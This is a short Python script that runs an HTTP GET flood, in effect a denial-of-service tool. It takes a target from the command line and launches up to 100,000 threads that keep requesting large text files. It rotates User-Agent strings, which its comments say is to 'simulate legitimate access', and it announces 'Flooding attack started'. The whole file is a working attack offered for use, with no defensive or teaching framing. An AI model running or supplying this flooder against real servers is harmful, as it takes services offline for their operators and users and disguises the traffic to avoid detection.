import requests
import sys
import time
import random
from concurrent.futures import ThreadPoolExecutor
from threading import Event

# List of User-Agent headers for randomization
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
]

# Event to handle stopping threads gracefully
stop_event = Event()

# List of legitimate GET request URLs
urls = [
    "/Shakespeare.txt",
    "/War_and_Peace.txt",
    "/Count_of_Monte_Cristo.txt",
    "/Ulysses.txt",
    "/My_Life.txt",
    "/Moby_Dick.txt",
    "/The_Republic.txt",
    "/Crime_and_Punishment.txt",
    "/Iliad.txt",
    "/Great_Expectations.txt"
]

# Function to send legitimate GET requests to the server
def send_get_request(target_url):
    while not stop_event.is_set():
        headers = {"User-Agent": random.choice(user_agents)}
        # Randomly select a URL endpoint to simulate legitimate access
        endpoint = random.choice(urls)
        full_url = f"{target_url}{endpoint}"

        try:
            # Suppressing server response output
            requests.get(full_url, headers=headers, timeout=5)
            # Simple notification to keep track of sent requests, if needed
            # Uncomment the line below to see minimal output indicating activity
            # print(f"Sent GET request to {full_url}")
            time.sleep(0.1)  # Rate limiting
        except requests.exceptions.RequestException as e:
            pass  # Silently handle any request errors

# Main function
def main():
    # Get the target IP address or URL from command-line arguments
    if len(sys.argv) < 2:
        print("Usage: python script_name.py <target_ip_or_url>")
        sys.exit(1)

    target_ip = sys.argv[1].strip()

    # Ensure the target_ip starts with 'http://' or 'https://'
    if not target_ip.startswith("http://") and not target_ip.startswith("https://"):
        target_ip = "http://" + target_ip

    # Number of threads
    max_threads = 100000

    # Using ThreadPoolExecutor to manage threads
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        print(f"Flooding attack started on {target_ip}. Press 'q' to quit.")

        # Continuously submit requests
        for _ in range(max_threads):
            executor.submit(send_get_request, target_ip)

        # Listen for user input to quit
        while True:
            command = input()
            if command.lower() == 'q':
                print("Terminating the attack...")
                stop_event.set()
                break

if __name__ == "__main__":
    main()
